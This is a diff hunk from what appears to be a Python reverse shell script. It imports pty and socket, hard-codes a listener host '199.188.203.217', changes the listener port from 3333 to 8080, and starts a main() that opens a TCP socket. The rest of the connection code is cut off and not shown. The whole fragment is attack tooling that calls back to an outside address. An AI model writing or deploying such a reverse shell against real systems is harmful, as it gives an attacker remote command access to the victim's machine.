@@ -15,7 +15,7 @@ import pty
 import socket
 
 lhost = "199.188.203.217" # XXX: CHANGEME
-lport = 3333 # XXX: CHANGEME
+lport = 8080 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
